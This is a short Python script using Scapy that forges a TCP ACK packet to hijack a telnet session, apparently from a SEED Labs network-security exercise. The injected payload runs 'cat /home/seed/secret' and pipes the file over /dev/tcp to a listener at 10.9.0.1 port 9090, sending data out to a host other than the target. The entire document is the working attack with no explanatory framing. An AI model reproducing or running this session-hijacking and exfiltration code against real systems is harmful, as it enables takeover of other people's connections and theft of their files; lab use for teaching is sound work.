#!/usr/bin/env python3
import sys
from scapy.all import *

print("SENDING SESSION HIJACKING PACKET...")
IPLayer = IP(src="10.9.0.5", dst="10.9.0.6")
TCPLayer = TCP(sport=23, dport=36408, flags="A",
                seq=1555220902, ack=3015903321)

Data = "\r cat /home/seed/secret > /dev/tcp/10.9.0.1/9090\r"
pkt = IPLayer/TCPLayer/Data
ls(pkt)
send(pkt,verbose=0)
